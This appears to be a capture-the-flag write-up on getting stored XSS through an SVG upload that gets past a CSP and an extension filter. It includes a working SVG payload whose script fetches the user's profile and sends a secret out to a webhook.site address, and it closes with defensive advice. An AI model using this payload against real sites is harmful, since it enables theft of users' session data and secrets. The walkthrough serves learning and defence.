---
title: "Stored XSS via SVG Upload"
date: 2026-02-08
description: "Bypassing CSP and file upload filters to achieve stored XSS through SVG injection"
tags: ["ctf", "xss", "web", "csp"]
weight: 2
---

## Challenge: ArtGallery

> Category: Web | Points: 450 | Solves: 18

An image gallery that allows SVG uploads. CSP is enabled. Steal the admin bot's cookie.

## CSP Analysis

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

No `unsafe-eval`, no external scripts. But `'self'` means scripts served from the same origin are allowed.

## SVG as Script Vector

SVG files can contain JavaScript. If the server serves uploaded SVGs with `Content-Type: image/svg+xml` from the same origin, the script executes under `'self'`.

## Crafting the Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    fetch('/api/profile', {credentials: 'include'})
      .then(r => r.json())
      .then(d => {
        new Image().src = 'https://webhook.site/abc123?flag=' + d.secret;
      });
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

## Bypass: File Extension Filter

The server blocks `.svg` extensions. But it checks the extension, not the MIME type.

Rename to `.svgz` (SVG compressed) — the server accepts it and serves it as `image/svg+xml`.

## Triggering Execution

The gallery renders uploads in `<img>` tags (safe — no script execution in `<img>`).

But the "View Original" link opens the SVG directly in a new tab:
```
/uploads/abc123.svgz → served as image/svg+xml → script executes!
```

## Getting the Flag

1. Upload malicious SVG
2. Report the gallery page to admin bot
3. Admin clicks "View Original" on our SVG
4. Script fires, fetches admin's profile, leaks the flag

```
FLAG{svg_upl04d_xss_byp4ss_csp}
```

## Defense

- Serve user uploads from a separate domain (different origin)
- Set `Content-Disposition: attachment` for downloads
- Sanitize SVG content (strip `<script>`, event handlers)
- Use `sandbox` CSP directive for uploaded content
